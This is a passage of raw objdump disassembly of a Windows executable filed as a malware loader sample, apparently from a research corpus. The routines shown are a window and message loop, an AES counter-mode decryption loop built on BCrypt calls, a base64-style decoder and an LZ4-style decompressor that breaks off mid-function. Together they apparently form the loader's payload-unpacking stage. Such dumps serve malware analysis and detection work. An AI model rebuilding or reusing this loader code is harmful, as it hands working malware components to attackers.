
malware_samples/loader/34744bd8c7ca1b2864c8bf641eb42e25979c07ad93d4f819e0255a3f9a245970.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001005:	57                   	push   %rdi
   140001006:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000100d:	48 8b d9             	mov    %rcx,%rbx
   140001010:	e8 cb 1f 00 00       	call   0x140002fe0
   140001015:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001018:	48 8d 05 f1 1f 00 00 	lea    0x1ff1(%rip),%rax        # 0x140003010
   14000101f:	0f 11 84 24 90 00 00 	movups %xmm0,0x90(%rsp)
   140001026:	00 
   140001027:	48 8d 3d da fc 00 00 	lea    0xfcda(%rip),%rdi        # 0x140010d08
   14000102e:	c7 84 24 90 00 00 00 	movl   $0x50,0x90(%rsp)
   140001035:	50 00 00 00 
   140001039:	0f 11 84 24 a0 00 00 	movups %xmm0,0xa0(%rsp)
   140001040:	00 
   140001041:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
   140001048:	00 
   140001049:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   140001050:	00 
   140001051:	0f 11 84 24 d0 00 00 	movups %xmm0,0xd0(%rsp)
   140001058:	00 
   140001059:	48 89 9c 24 a8 00 00 	mov    %rbx,0xa8(%rsp)
   140001060:	00 
   140001061:	48 89 bc 24 d0 00 00 	mov    %rdi,0xd0(%rsp)
   140001068:	00 
   140001069:	0f 11 84 24 b0 00 00 	movups %xmm0,0xb0(%rsp)
   140001070:	00 
   140001071:	0f 11 84 24 c0 00 00 	movups %xmm0,0xc0(%rsp)
   140001078:	00 
   140001079:	ff 15 c1 f1 00 00    	call   *0xf1c1(%rip)        # 0x140010240
   14000107f:	33 c0                	xor    %eax,%eax
   140001081:	4c 8d 05 8d fc 00 00 	lea    0xfc8d(%rip),%r8        # 0x140010d15
   140001088:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000108d:	45 33 c9             	xor    %r9d,%r9d
   140001090:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001095:	48 8b d7             	mov    %rdi,%rdx
   140001098:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000109d:	33 c9                	xor    %ecx,%ecx
   14000109f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400010a4:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   1400010ab:	00 
   1400010ac:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   1400010b3:	00 
   1400010b4:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400010b8:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400010bc:	ff 15 76 f1 00 00    	call   *0xf176(%rip)        # 0x140010238
   1400010c2:	48 85 c0             	test   %rax,%rax
   1400010c5:	75 18                	jne    0x1400010df
   1400010c7:	e8 f4 06 00 00       	call   0x1400017c0
   1400010cc:	33 c0                	xor    %eax,%eax
   1400010ce:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   1400010d5:	00 
   1400010d6:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   1400010dd:	5f                   	pop    %rdi
   1400010de:	c3                   	ret
   1400010df:	45 33 c9             	xor    %r9d,%r9d
   1400010e2:	ba cc 1c 00 00       	mov    $0x1ccc,%edx
   1400010e7:	41 b8 74 00 00 00    	mov    $0x74,%r8d
   1400010ed:	48 8b c8             	mov    %rax,%rcx
   1400010f0:	ff 15 3a f1 00 00    	call   *0xf13a(%rip)        # 0x140010230
   1400010f6:	45 33 c9             	xor    %r9d,%r9d
   1400010f9:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400010fe:	45 33 c0             	xor    %r8d,%r8d
   140001101:	33 d2                	xor    %edx,%edx
   140001103:	ff 15 5f f1 00 00    	call   *0xf15f(%rip)        # 0x140010268
   140001109:	85 c0                	test   %eax,%eax
   14000110b:	7e 30                	jle    0x14000113d
   14000110d:	0f 1f 00             	nopl   (%rax)
   140001110:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001115:	ff 15 45 f1 00 00    	call   *0xf145(%rip)        # 0x140010260
   14000111b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001120:	ff 15 32 f1 00 00    	call   *0xf132(%rip)        # 0x140010258
   140001126:	45 33 c9             	xor    %r9d,%r9d
   140001129:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000112e:	45 33 c0             	xor    %r8d,%r8d
   140001131:	33 d2                	xor    %edx,%edx
   140001133:	ff 15 2f f1 00 00    	call   *0xf12f(%rip)        # 0x140010268
   140001139:	85 c0                	test   %eax,%eax
   14000113b:	7f d3                	jg     0x140001110
   14000113d:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   140001144:	00 
   140001145:	33 c0                	xor    %eax,%eax
   140001147:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000114e:	5f                   	pop    %rdi
   14000114f:	c3                   	ret
   140001150:	4c 8b dc             	mov    %rsp,%r11
   140001153:	55                   	push   %rbp
   140001154:	53                   	push   %rbx
   140001155:	56                   	push   %rsi
   140001156:	57                   	push   %rdi
   140001157:	41 56                	push   %r14
   140001159:	49 8d 6b c8          	lea    -0x38(%r11),%rbp
   14000115d:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   140001164:	48 8b 05 95 ce 01 00 	mov    0x1ce95(%rip),%rax        # 0x14001e000
   14000116b:	48 33 c4             	xor    %rsp,%rax
   14000116e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001172:	4c 8b 15 ff d9 01 00 	mov    0x1d9ff(%rip),%r10        # 0x14001eb78
   140001179:	41 8b f1             	mov    %r9d,%esi
   14000117c:	49 8b f8             	mov    %r8,%rdi
   14000117f:	48 8b da             	mov    %rdx,%rbx
   140001182:	4c 8b f1             	mov    %rcx,%r14
   140001185:	4d 85 d2             	test   %r10,%r10
   140001188:	0f 84 46 02 00 00    	je     0x1400013d4
   14000118e:	48 83 3d fa d9 01 00 	cmpq   $0x0,0x1d9fa(%rip)        # 0x14001eb90
   140001195:	00 
   140001196:	0f 84 38 02 00 00    	je     0x1400013d4
   14000119c:	48 83 3d e4 d9 01 00 	cmpq   $0x0,0x1d9e4(%rip)        # 0x14001eb88
   1400011a3:	00 
   1400011a4:	0f 84 2a 02 00 00    	je     0x1400013d4
   1400011aa:	48 83 3d e6 d9 01 00 	cmpq   $0x0,0x1d9e6(%rip)        # 0x14001eb98
   1400011b1:	00 
   1400011b2:	0f 84 1c 02 00 00    	je     0x1400013d4
   1400011b8:	48 83 3d e0 d9 01 00 	cmpq   $0x0,0x1d9e0(%rip)        # 0x14001eba0
   1400011bf:	00 
   1400011c0:	0f 84 0e 02 00 00    	je     0x1400013d4
   1400011c6:	33 c9                	xor    %ecx,%ecx
   1400011c8:	4d 89 63 10          	mov    %r12,0x10(%r11)
   1400011cc:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   1400011d1:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400011d5:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   1400011da:	33 c0                	xor    %eax,%eax
   1400011dc:	4d 89 6b d0          	mov    %r13,-0x30(%r11)
   1400011e0:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400011e5:	4d 89 7b c8          	mov    %r15,-0x38(%r11)
   1400011e9:	45 33 c9             	xor    %r9d,%r9d
   1400011ec:	45 33 c0             	xor    %r8d,%r8d
   1400011ef:	c7 45 80 41 00 45 00 	movl   $0x450041,-0x80(%rbp)
   1400011f6:	c7 45 84 53 00 00 00 	movl   $0x53,-0x7c(%rbp)
   1400011fd:	45 33 ff             	xor    %r15d,%r15d
   140001200:	c7 45 88 43 00 68 00 	movl   $0x680043,-0x78(%rbp)
   140001207:	c7 45 8c 61 00 69 00 	movl   $0x690061,-0x74(%rbp)
   14000120e:	c7 45 90 6e 00 69 00 	movl   $0x69006e,-0x70(%rbp)
   140001215:	c7 45 94 6e 00 67 00 	movl   $0x67006e,-0x6c(%rbp)
   14000121c:	c7 45 98 4d 00 6f 00 	movl   $0x6f004d,-0x68(%rbp)
   140001223:	c7 45 9c 64 00 65 00 	movl   $0x650064,-0x64(%rbp)
   14000122a:	66 89 45 a0          	mov    %ax,-0x60(%rbp)
   14000122e:	c7 45 a8 43 00 68 00 	movl   $0x680043,-0x58(%rbp)
   140001235:	c7 45 ac 61 00 69 00 	movl   $0x690061,-0x54(%rbp)
   14000123c:	c7 45 b0 6e 00 69 00 	movl   $0x69006e,-0x50(%rbp)
   140001243:	c7 45 b4 6e 00 67 00 	movl   $0x67006e,-0x4c(%rbp)
   14000124a:	c7 45 b8 4d 00 6f 00 	movl   $0x6f004d,-0x48(%rbp)
   140001251:	c7 45 bc 64 00 65 00 	movl   $0x650064,-0x44(%rbp)
   140001258:	c7 45 c0 45 00 43 00 	movl   $0x430045,-0x40(%rbp)
   14000125f:	c7 45 c4 42 00 00 00 	movl   $0x42,-0x3c(%rbp)
   140001266:	41 ff d2             	call   *%r10
   140001269:	4c 8b ac 24 08 01 00 	mov    0x108(%rsp),%r13
   140001270:	00 
   140001271:	4c 8b a4 24 48 01 00 	mov    0x148(%rsp),%r12
   140001278:	00 
   140001279:	85 c0                	test   %eax,%eax
   14000127b:	0f 85 4b 01 00 00    	jne    0x1400013cc
   140001281:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001286:	4c 8d 45 a8          	lea    -0x58(%rbp),%r8
   14000128a:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140001290:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140001295:	48 8d 55 88          	lea    -0x78(%rbp),%rdx
   140001299:	ff 15 e1 d8 01 00    	call   *0x1d8e1(%rip)        # 0x14001eb80
   14000129f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400012a4:	85 c0                	test   %eax,%eax
   1400012a6:	0f 85 18 01 00 00    	jne    0x1400013c4
   1400012ac:	44 89 7c 24 30       	mov    %r15d,0x30(%rsp)
   1400012b1:	48 8d 54 24 68       	lea    0x68(%rsp),%rdx
   1400012b6:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   1400012bd:	00 
   1400012be:	45 33 c9             	xor    %r9d,%r9d
   1400012c1:	45 33 c0             	xor    %r8d,%r8d
   1400012c4:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400012c9:	ff 15 b9 d8 01 00    	call   *0x1d8b9(%rip)        # 0x14001eb88
   1400012cf:	85 c0                	test   %eax,%eax
   1400012d1:	0f 85 e8 00 00 00    	jne    0x1400013bf
   1400012d7:	0f 10 03             	movups (%rbx),%xmm0
   1400012da:	41 8b df             	mov    %r15d,%ebx
   1400012dd:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400012e2:	85 f6                	test   %esi,%esi
   1400012e4:	0f 8e ca 00 00 00    	jle    0x1400013b4
   1400012ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400012f0:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400012f5:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400012fa:	44 89 7c 24 48       	mov    %r15d,0x48(%rsp)
   1400012ff:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140001303:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001308:	45 33 c9             	xor    %r9d,%r9d
   14000130b:	c7 44 24 38 10 00 00 	movl   $0x10,0x38(%rsp)
   140001312:	00 
   140001313:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140001317:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000131c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140001322:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140001327:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000132c:	66 0f 7f 45 d0       	movdqa %xmm0,-0x30(%rbp)
   140001331:	44 89 7c 24 60       	mov    %r15d,0x60(%rsp)
   140001336:	ff 15 54 d8 01 00    	call   *0x1d854(%rip)        # 0x14001eb90
   14000133c:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140001342:	8b c6                	mov    %esi,%eax
   140001344:	2b c3                	sub    %ebx,%eax
   140001346:	45 8b c7             	mov    %r15d,%r8d
   140001349:	41 3b c1             	cmp    %r9d,%eax
   14000134c:	44 0f 4c c8          	cmovl  %eax,%r9d
   140001350:	45 85 c9             	test   %r9d,%r9d
   140001353:	7e 25                	jle    0x14000137a
   140001355:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000135c:	00 00 00 00 
   140001360:	41 8d 04 18          	lea    (%r8,%rbx,1),%eax
   140001364:	48 63 d0             	movslq %eax,%rdx
   140001367:	41 8b c0             	mov    %r8d,%eax
   14000136a:	41 ff c0             	inc    %r8d
   14000136d:	0f b6 4c 05 e0       	movzbl -0x20(%rbp,%rax,1),%ecx
   140001372:	30 0c 3a             	xor    %cl,(%rdx,%rdi,1)
   140001375:	45 3b c1             	cmp    %r9d,%r8d
   140001378:	7c e6                	jl     0x140001360
   14000137a:	ba 0f 00 00 00       	mov    $0xf,%edx
   14000137f:	90                   	nop
   140001380:	8b c2                	mov    %edx,%eax
   140001382:	80 44 04 70 01       	addb   $0x1,0x70(%rsp,%rax,1)
   140001387:	75 1a                	jne    0x1400013a3
   140001389:	80 44 04 6f 01       	addb   $0x1,0x6f(%rsp,%rax,1)
   14000138e:	75 13                	jne    0x1400013a3
   140001390:	80 44 04 6e 01       	addb   $0x1,0x6e(%rsp,%rax,1)
   140001395:	75 0c                	jne    0x1400013a3
   140001397:	80 44 04 6d 01       	addb   $0x1,0x6d(%rsp,%rax,1)
   14000139c:	75 05                	jne    0x1400013a3
   14000139e:	83 ea 04             	sub    $0x4,%edx
   1400013a1:	79 dd                	jns    0x140001380
   1400013a3:	83 c3 10             	add    $0x10,%ebx
   1400013a6:	3b de                	cmp    %esi,%ebx
   1400013a8:	7d 0a                	jge    0x1400013b4
   1400013aa:	0f 28 44 24 70       	movaps 0x70(%rsp),%xmm0
   1400013af:	e9 3c ff ff ff       	jmp    0x1400012f0
   1400013b4:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400013b9:	ff 15 d9 d7 01 00    	call   *0x1d7d9(%rip)        # 0x14001eb98
   1400013bf:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   1400013c4:	33 d2                	xor    %edx,%edx
   1400013c6:	ff 15 d4 d7 01 00    	call   *0x1d7d4(%rip)        # 0x14001eba0
   1400013cc:	4c 8b bc 24 00 01 00 	mov    0x100(%rsp),%r15
   1400013d3:	00 
   1400013d4:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400013d8:	48 33 cc             	xor    %rsp,%rcx
   1400013db:	e8 30 1d 00 00       	call   0x140003110
   1400013e0:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   1400013e7:	41 5e                	pop    %r14
   1400013e9:	5f                   	pop    %rdi
   1400013ea:	5e                   	pop    %rsi
   1400013eb:	5b                   	pop    %rbx
   1400013ec:	5d                   	pop    %rbp
   1400013ed:	c3                   	ret
   1400013ee:	cc                   	int3
   1400013ef:	cc                   	int3
   1400013f0:	40 55                	rex push %rbp
   1400013f2:	57                   	push   %rdi
   1400013f3:	41 56                	push   %r14
   1400013f5:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1400013fc:	66 0f 6f 05 dc f9 00 	movdqa 0xf9dc(%rip),%xmm0        # 0x140010de0
   140001403:	00 
   140001404:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001409:	49 8b f8             	mov    %r8,%rdi
   14000140c:	8b ea                	mov    %edx,%ebp
   14000140e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001414:	4c 8b f1             	mov    %rcx,%r14
   140001417:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000141e:	00 00 
   140001420:	0f 11 00             	movups %xmm0,(%rax)
   140001423:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   140001427:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   14000142b:	0f 11 40 30          	movups %xmm0,0x30(%rax)
   14000142f:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140001433:	0f 11 40 50          	movups %xmm0,0x50(%rax)
   140001437:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   14000143b:	0f 11 40 70          	movups %xmm0,0x70(%rax)
   14000143f:	48 8d 80 80 00 00 00 	lea    0x80(%rax),%rax
   140001446:	49 83 e8 01          	sub    $0x1,%r8
   14000144a:	75 d4                	jne    0x140001420
   14000144c:	0f b6 05 1d f8 00 00 	movzbl 0xf81d(%rip),%eax        # 0x140010c70
   140001453:	33 d2                	xor    %edx,%edx
   140001455:	0f 28 15 d4 f7 00 00 	movaps 0xf7d4(%rip),%xmm2        # 0x140010c30
   14000145c:	0f 28 05 dd f7 00 00 	movaps 0xf7dd(%rip),%xmm0        # 0x140010c40
   140001463:	0f 28 0d e6 f7 00 00 	movaps 0xf7e6(%rip),%xmm1        # 0x140010c50
   14000146a:	88 44 24 40          	mov    %al,0x40(%rsp)
   14000146e:	66 0f 7e d0          	movd   %xmm2,%eax
   140001472:	0f 29 44 24 10       	movaps %xmm0,0x10(%rsp)
   140001477:	0f 28 05 e2 f7 00 00 	movaps 0xf7e2(%rip),%xmm0        # 0x140010c60
   14000147e:	0f 29 14 24          	movaps %xmm2,(%rsp)
   140001482:	0f 29 4c 24 20       	movaps %xmm1,0x20(%rsp)
   140001487:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   14000148c:	84 c0                	test   %al,%al
   14000148e:	74 16                	je     0x1400014a6
   140001490:	48 63 c2             	movslq %edx,%rax
   140001493:	0f b6 0c 04          	movzbl (%rsp,%rax,1),%ecx
   140001497:	88 54 0c 50          	mov    %dl,0x50(%rsp,%rcx,1)
   14000149b:	ff c2                	inc    %edx
   14000149d:	48 63 c2             	movslq %edx,%rax
   1400014a0:	80 3c 04 00          	cmpb   $0x0,(%rsp,%rax,1)
   1400014a4:	75 ea                	jne    0x140001490
   1400014a6:	33 c0                	xor    %eax,%eax
   1400014a8:	c6 84 24 8d 00 00 00 	movb   $0xfe,0x8d(%rsp)
   1400014af:	fe 
   1400014b0:	45 33 c9             	xor    %r9d,%r9d
   1400014b3:	83 fd 03             	cmp    $0x3,%ebp
   1400014b6:	0f 8e d6 00 00 00    	jle    0x140001592
   1400014bc:	48 89 9c 24 70 01 00 	mov    %rbx,0x170(%rsp)
   1400014c3:	00 
   1400014c4:	48 89 b4 24 78 01 00 	mov    %rsi,0x178(%rsp)
   1400014cb:	00 
   1400014cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400014d0:	49 63 d1             	movslq %r9d,%rdx
   1400014d3:	49 03 d6             	add    %r14,%rdx
   1400014d6:	0f b6 0a             	movzbl (%rdx),%ecx
   1400014d9:	44 0f b6 5c 0c 50    	movzbl 0x50(%rsp,%rcx,1),%r11d
   1400014df:	41 81 fb 80 00 00 00 	cmp    $0x80,%r11d
   1400014e6:	0f 83 96 00 00 00    	jae    0x140001582
   1400014ec:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   1400014f0:	0f b6 5c 0c 50       	movzbl 0x50(%rsp,%rcx,1),%ebx
   1400014f5:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
   1400014fb:	0f 83 81 00 00 00    	jae    0x140001582
   140001501:	0f b6 4a 02          	movzbl 0x2(%rdx),%ecx
   140001505:	45 33 d2             	xor    %r10d,%r10d
   140001508:	44 0f b6 44 0c 50    	movzbl 0x50(%rsp,%rcx,1),%r8d
   14000150e:	0f b6 4a 03          	movzbl 0x3(%rdx),%ecx
   140001512:	41 80 f8 80          	cmp    $0x80,%r8b
   140001516:	45 0f 42 d0          	cmovb  %r8d,%r10d
   14000151a:	41 c1 e3 06          	shl    $0x6,%r11d
   14000151e:	44 0b db             	or     %ebx,%r11d
   140001521:	0f b6 74 0c 50       	movzbl 0x50(%rsp,%rcx,1),%esi
   140001526:	33 c9                	xor    %ecx,%ecx
   140001528:	41 c1 e3 06          	shl    $0x6,%r11d
   14000152c:	45 0b d3             	or     %r11d,%r10d
   14000152f:	41 c1 e2 06          	shl    $0x6,%r10d
   140001533:	40 80 fe 80          	cmp    $0x80,%sil
   140001537:	0f 42 ce             	cmovb  %esi,%ecx
   14000153a:	44 0b d1             	or     %ecx,%r10d
   14000153d:	48 63 c8             	movslq %eax,%rcx
   140001540:	41 8b d2             	mov    %r10d,%edx
   140001543:	c1 ea 10             	shr    $0x10,%edx
   140001546:	88 14 39             	mov    %dl,(%rcx,%rdi,1)
   140001549:	41 80 f8 80          	cmp    $0x80,%r8b
   14000154d:	73 12                	jae    0x140001561
   14000154f:	48 63 c8             	movslq %eax,%rcx
   140001552:	41 8b d2             	mov    %r10d,%edx
   140001555:	c1 ea 08             	shr    $0x8,%edx
   140001558:	83 c0 02             	add    $0x2,%eax
   14000155b:	88 54 39 01          	mov    %dl,0x1(%rcx,%rdi,1)
   14000155f:	eb 02                	jmp    0x140001563
   140001561:	ff c0                	inc    %eax
   140001563:	40 80 fe 80          	cmp    $0x80,%sil
   140001567:	73 09                	jae    0x140001572
   140001569:	48 63 c8             	movslq %eax,%rcx
   14000156c:	ff c0                	inc    %eax
   14000156e:	44 88 14 39          	mov    %r10b,(%rcx,%rdi,1)
   140001572:	41 83 c1 04          	add    $0x4,%r9d
   140001576:	41 8d 49 03          	lea    0x3(%r9),%ecx
   14000157a:	3b cd                	cmp    %ebp,%ecx
   14000157c:	0f 8c 4e ff ff ff    	jl     0x1400014d0
   140001582:	48 8b 9c 24 70 01 00 	mov    0x170(%rsp),%rbx
   140001589:	00 
   14000158a:	48 8b b4 24 78 01 00 	mov    0x178(%rsp),%rsi
   140001591:	00 
   140001592:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140001599:	41 5e                	pop    %r14
   14000159b:	5f                   	pop    %rdi
   14000159c:	5d                   	pop    %rbp
   14000159d:	c3                   	ret
   14000159e:	cc                   	int3
   14000159f:	cc                   	int3
   1400015a0:	40 55                	rex push %rbp
   1400015a2:	56                   	push   %rsi
   1400015a3:	41 54                	push   %r12
   1400015a5:	41 57                	push   %r15
   1400015a7:	48 83 ec 28          	sub    $0x28,%rsp
   1400015ab:	4d 8b e0             	mov    %r8,%r12
   1400015ae:	8b f2                	mov    %edx,%esi
   1400015b0:	48 8b e9             	mov    %rcx,%rbp
   1400015b3:	83 fa 04             	cmp    $0x4,%edx
   1400015b6:	0f 8c f1 01 00 00    	jl     0x1400017ad
   1400015bc:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   1400015c0:	44 0f b6 79 03       	movzbl 0x3(%rcx),%r15d
   1400015c5:	41 c1 e7 08          	shl    $0x8,%r15d
   1400015c9:	44 0b f8             	or     %eax,%r15d
   1400015cc:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   1400015d0:	41 c1 e7 08          	shl    $0x8,%r15d
   1400015d4:	44 0b f8             	or     %eax,%r15d
   1400015d7:	0f b6 01             	movzbl (%rcx),%eax
   1400015da:	41 c1 e7 08          	shl    $0x8,%r15d
   1400015de:	44 0b f8             	or     %eax,%r15d
   1400015e1:	45 3b f9             	cmp    %r9d,%r15d
   1400015e4:	0f 8f c3 01 00 00    	jg     0x1400017ad
   1400015ea:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1400015ef:	48 83 c5 04          	add    $0x4,%rbp
   1400015f3:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   1400015f8:	83 ee 04             	sub    $0x4,%esi
   1400015fb:	33 ff                	xor    %edi,%edi
   1400015fd:	33 db                	xor    %ebx,%ebx
   1400015ff:	85 f6                	test   %esi,%esi
   140001601:	0f 8e 8f 01 00 00    	jle    0x140001796
   140001607:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000160c:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   140001611:	41 3b ff             	cmp    %r15d,%edi
   140001614:	0f 83 72 01 00 00    	jae    0x14000178c
   14000161a:	48 63 c3             	movslq %ebx,%rax
   14000161d:	ff c3                	inc    %ebx
   14000161f:	44 0f b6 2c 28       	movzbl (%rax,%rbp,1),%r13d
   140001624:	41 8b d5             	mov    %r13d,%edx
   140001627:	c1 ea 04             	shr    $0x4,%edx
   14000162a:	83 fa 0f             	cmp    $0xf,%edx
   14000162d:	75 25                	jne    0x140001654
   14000162f:	3b de                	cmp    %esi,%ebx
   140001631:	7d 21                	jge    0x140001654
   140001633:	0f 1f 40 00          	nopl   0x0(%rax)
   140001637:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000163e:	00 00 
   140001640:	48 63 c3             	movslq %ebx,%rax
   140001643:	ff c3                	inc    %ebx
   140001645:	0f b6 0c 28          	movzbl (%rax,%rbp,1),%ecx
   140001649:	03 d1                	add    %ecx,%edx
   14000164b:	80 f9 ff             	cmp    $0xff,%cl
   14000164e:	75 04                	jne    0x140001654
   140001650:	3b de                	cmp    %esi,%ebx
   140001652:	7c ec                	jl     0x140001640
   140001654:	8d 04 1a             	lea    (%rdx,%rbx,1),%eax
   140001657:	8b ce                	mov    %esi,%ecx
   140001659:	2b cb                	sub    %ebx,%ecx
   14000165b:	45 8b f7             	mov    %r15d,%r14d
   14000165e:	3b c6                	cmp    %esi,%eax
   140001660:	0f 4e ca             	cmovle %edx,%ecx
   140001663:	44 2b f7             	sub    %edi,%r14d
   140001666:	8d 04 39             	lea    (%rcx,%rdi,1),%eax
   140001669:	41 3b c7             	cmp    %r15d,%eax
   14000166c:	44 0f 4e f1          	cmovle %ecx,%r14d
   140001670:	45 85 f6             	test   %r14d,%r14d
   140001673:	7e 69                	jle    0x1400016de
   140001675:	45 33 c9             	xor    %r9d,%r9d
   140001678:	41 83 fe 10          	cmp    $0x10,%r14d
   14000167c:	72 42                	jb     0x1400016c0
   14000167e:	45 8d 56 ff          	lea    -0x1(%r14),%r10d
   140001682:	48 63 cf             	movslq %edi,%rcx
   140001685:	41 8d 04 1a          	lea    (%r10,%rbx,1),%eax
   140001689:	48 63 d3             	movslq %ebx,%rdx
   14000168c:	4c 63 c0             	movslq %eax,%r8
   14000168f:	49 03 cc             	add    %r12,%rcx
   140001692:	4c 03 c5             	add    %rbp,%r8
   140001695:	48 03 d5             	add    %rbp,%rdx
   140001698:	49 3b c8             	cmp    %r8,%rcx
   14000169b:	77 0f                	ja     0x1400016ac
   14000169d:	41 8d 04 3a          	lea    (%r10,%rdi,1),%eax
   1400016a1:	4c 63 c0             	movslq %eax,%r8
   1400016a4:	4d 03 c4             	add    %r12,%r8
   1400016a7:	4c 3b c2             	cmp    %rdx,%r8
   1400016aa:	73 14                	jae    0x1400016c0
   1400016ac:	4d 63 c6             	movslq %r14d,%r8
   1400016af:	e8 9c d3 00 00       	call   0x14000ea50
   1400016b4:	eb 28                	jmp    0x1400016de
   1400016b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400016bd:	00 00 00 
   1400016c0:	41 8d 04 19          	lea    (%r9,%rbx,1),%eax
   1400016c4:	48 63 d0             	movslq %eax,%rdx
   1400016c7:	41 8d 04 39          	lea    (%r9,%rdi,1),%eax
   1400016cb:	48 63 c8             	movslq %eax,%rcx
   1400016ce:	41 ff c1             	inc    %r9d
   1400016d1:	0f b6 04 2a          	movzbl (%rdx,%rbp,1),%eax
   1400016d5:	42 88 04 21          	mov    %al,(%rcx,%r12,1)
   1400016d9:	45 3b ce             	cmp    %r14d,%r9d
   1400016dc:	7c e2                	jl     0x1400016c0
   1400016de:	41 03 de             	add    %r14d,%ebx
   1400016e1:	41 03 fe             	add    %r14d,%edi
   1400016e4:	3b de                	cmp    %esi,%ebx
   1400016e6:	0f 8d a0 00 00 00    	jge    0x14000178c
   1400016ec:	41 3b ff             	cmp    %r15d,%edi
   1400016ef:	0f 83 97 00 00 00    	jae    0x14000178c
   1400016f5:	8d 43 01             	lea    0x1(%rbx),%eax
   1400016f8:	3b c6                	cmp    %esi,%eax
   1400016fa:	0f 8d 8c 00 00 00    	jge    0x14000178c
   140001700:	48 63 c3             	movslq %ebx,%rax
   140001703:	44 0f b6 54 28 01    	movzbl 0x1(%rax,%rbp,1),%r10d
   140001709:	0f b6 04 28          	movzbl (%rax,%rbp,1),%eax
   14000170d:	41 c1 e2 08          	shl    $0x8,%r10d
   140001711:	44 0b d0             	or     %eax,%r10d
   140001714:	74 76                	je     0x14000178c
   140001716:	41 83 e5 0f          	and    $0xf,%r13d
   14000171a:	83 c3 02             	add    $0x2,%ebx
   14000171d:	41 8d 55 04          	lea    0x4(%r13),%edx
   140001721:	41 83 fd 0f          	cmp    $0xf,%r13d
   140001725:	75 1d                	jne    0x140001744
   140001727:	3b de                	cmp    %esi,%ebx
   140001729:	7d 19                	jge    0x140001744
   14000172b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001730:	48 63 c3             	movslq %ebx,%rax
   140001733:	ff c3                	inc    %ebx
   140001735:	0f b6 0c 28          	movzbl (%rax,%rbp,1),%ecx
   140001739:	03 d1                	add    %ecx,%edx
   14000173b:	80 f9 ff             	cmp    $0xff,%cl
   14000173e:	75 04                	jne    0x140001744
   140001740:	3b de                	cmp    %esi,%ebx
   140001742:	7c ec                	jl     0x140001730
   140001744:	45 8b c7             	mov    %r15d,%r8d
   140001747:	44 8b cf             	mov    %edi,%r9d
